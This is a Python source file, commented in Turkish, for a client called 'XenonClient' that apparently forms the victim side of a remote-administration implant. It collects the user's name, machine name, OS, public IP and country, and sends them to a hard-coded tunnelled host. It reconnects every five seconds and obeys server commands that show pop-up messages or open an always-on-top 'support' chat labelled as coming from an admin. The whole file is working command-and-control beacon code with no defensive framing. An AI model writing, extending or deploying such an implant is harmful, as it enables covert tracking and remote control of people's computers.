import socket, subprocess, json, time, threading, tkinter as tk
from tkinter import messagebox
import platform, getpass, urllib.request

class XenonClient:
    def __init__(self, ip, port):
        self.server_ip = ip; self.port = port
        self.chat_win = None

    def get_info(self):
        # Sistem bilgilerini topla
        info = {
            "id": f"{getpass.getuser()}@{platform.node()}",
            "ip": "Local IP",
            "country": "TR",
            "os": f"{platform.system()} {platform.release()}"
        }
        try:
            with urllib.request.urlopen("http://ip-api.com/json/", timeout=3) as r:
                data = json.loads(r.read().decode())
                info["ip"] = data.get("query")
                info["country"] = data.get("countryCode")
        except: pass
        return info

    def run(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.server_ip, self.port))
                # Bilgileri gönder
                self.sock.send(json.dumps(self.get_info()).encode("utf-8"))
                
                while True:
                    data = self.sock.recv(16384).decode("utf-8")
                    if not data: break
                    
                    if data == "chat_open":
                        threading.Thread(target=self.create_chat_ui, daemon=True).start()
                    elif data.startswith("chat_msg|"):
                        if self.chat_win: self.chat_box.insert("end", f"ADMIN: {data.split('|')[1]}\n")
                    elif data == "chat_close":
                        if self.chat_win: self.chat_win.quit()
                    elif data.startswith("msg|"):
                        threading.Thread(target=lambda: messagebox.showinfo("Xenon", data.split("|")[1])).start()
            except: time.sleep(5)

    def create_chat_ui(self):
        self.chat_win = tk.Tk(); self.chat_win.title("Destek"); self.chat_win.geometry("350x400")
        self.chat_win.attributes("-topmost", True)
        self.chat_box = tk.Text(self.chat_win, bg="black", fg="#00FF00")
        self.chat_box.pack(expand=True, fill="both")
        entry = tk.Entry(self.chat_win); entry.pack(fill="x")
        entry.bind("<Return>", lambda e: [self.sock.send(f"chat|{entry.get()}".encode("utf-8")), self.chat_box.insert("end", f"SİZ: {entry.get()}\n"), entry.delete(0, 'end')])
        self.chat_win.mainloop()
        self.chat_win = None

if __name__ == "__main__":
    XenonClient("uwtd3ffva.localto.net", 8212).run()
